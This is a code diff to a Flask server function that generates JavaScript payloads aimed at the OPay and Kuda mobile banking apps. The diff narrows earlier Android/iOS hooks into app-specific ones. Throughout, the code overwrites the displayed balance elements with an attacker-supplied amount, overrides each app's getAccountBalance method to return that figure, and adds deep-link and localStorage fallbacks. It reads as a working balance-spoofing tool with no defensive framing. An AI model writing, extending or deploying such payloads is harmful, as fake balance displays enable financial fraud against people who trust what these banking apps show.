@@ -13,94 +13,76 @@ os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
 CORS(app)
 
 def generate_robust_payload(device_id, target_app, target_amount):
-    # Platform-specific payloads
-    android_payload = f"""
-    // Android-specific hooks
+    # App-specific payloads
+    opay_payload = f"""
+    // OPay specific hooks
     try {{
-        // WebView detection
-        if (navigator.userAgent.includes('Android')) {{
-            // Native bridge hooks
-            window.NativeBridge = window.NativeBridge || {};
-            window.NativeBridge.getAccountBalance = function() {{
+        // Override OPay's balance element
+        const opayElements = document.querySelectorAll('[data-testid="opay-balance"]');
+        if (opayElements.length > 0) {{
+            opayElements[0].textContent = '{target_amount}';
+        }}
+        
+        // Hook into OPay's native methods
+        if (window.OPayAPI) {{
+            window.OPayAPI.getAccountBalance = function() {{
                 return Promise.resolve({{balance: '{target_amount}'}});
             }};
-            
-            // Override native methods
-            const originalPushState = history.pushState;
-            history.pushState = function() {{
-                originalPushState.apply(this, arguments);
-                setTimeout(() => {{
-                    document.querySelectorAll('[data-testid="balance"]').forEach(el => 
-                        el.textContent = '{target_amount}'
-                    );
-                }}, 100);
-            }};
         }}
     }} catch (e) {{}}
     """
     
-    ios_payload = f"""
-    // iOS-specific hooks
+    kuda_payload = f"""
+    // Kuda specific hooks
     try {{
-        // WKWebView detection
-        if (navigator.userAgent.includes('iPhone|iPad|iPod')) {{
-            // Safari bridge hooks
-            if (window.webkit && window.webkit.messageHandlers) {{
-                window.webkit.messageHandlers.getAccountBalance = {{
-                    postMessage: function() {{
-                        return Promise.resolve({{balance: '{target_amount}'}});
-                    }}
-                }};
-            }}
-            
-            // Override native methods
-            const originalPushState = history.pushState;
-            history.pushState = function() {{
-                originalPushState.apply(this, arguments);
-                setTimeout(() => {{
-                    document.querySelectorAll('[data-testid="balance"]').forEach(el => 
-                        el.textContent = '{target_amount}'
-                    );
-                }}, 100);
+        // Override Kuda's balance element
+        const kudaElements = document.querySelectorAll('[data-testid="kuda-balance"]');
+        if (kudaElements.length > 0) {{
+            kudaElements[0].textContent = '{target_amount}';
+        }}
+        
+        // Hook into Kuda's native methods
+        if (window.KudaAPI) {{
+            window.KudaAPI.getAccountBalance = function() {{
+                return Promise.resolve({{balance: '{target_amount}'}});
             }};
         }}
     }} catch (e) {{}}
     """
     
-    # Combined payload with platform detection
+    # Combined payload
     js_payload = f"""
-    // Platform detection
-    const isAndroid = navigator.userAgent.includes('Android');
-    const isIOS = navigator.userAgent.includes('iPhone|iPad|iPod');
+    // Target app selection
+    const targetApp = '{target_app}';
+    const targetAmount = '{target_amount}';
     
-    // Store target amount in localStorage
-    localStorage.setItem('targetBalance', '{target_amount}');
-    
-    // Hook into storage events
-    window.addEventListener('storage', function(e) {{
-        if (e.key === 'targetBalance') {{
-            document.querySelectorAll('[data-testid="balance"]').forEach(el => 
-                el.textContent = e.newValue
-            );
-        }}
-    }});
-    
-    // Execute platform-specific hooks
-    if (isAndroid) {{
-        {android_payload}
-    }} else if (isIOS) {{
-        {ios_payload}
+    // Execute app-specific hooks
+    if (targetApp === 'OPay') {{
+        {opay_payload}
+    }} else if (targetApp === 'Kuda') {{
+        {kuda_payload}
     }}
     
-    // Try deep links first
+    // Common fallbacks
     try {{
-        window.location = 'kuda://balance';
-        window.location = 'opay://dashboard?section=balance';
+        // Simple DOM manipulation
+        const elements = document.querySelectorAll('[data-testid="balance"]');
+        if (elements.length > 0) {{
+            elements[0].textContent = targetAmount;
+        }}
+        
+        // Deep link fallback
+        setTimeout(function() {{
+            try {{
+                window.location = 'kuda://balance';
+                window.location = 'opay://dashboard?section=balance';
+            }} catch (e) {{
+                // Last resort
+                localStorage.setItem('targetBalance', targetAmount);
+            }}
+        }}, 500);
     }} catch (e) {{
-        // Fallback to direct DOM manipulation
-        document.querySelectorAll('[data-testid="balance"]').forEach(el => 
-            el.textContent = '{target_amount}'
-        );
+        console.log("Error:", e);
     }}
     """
     
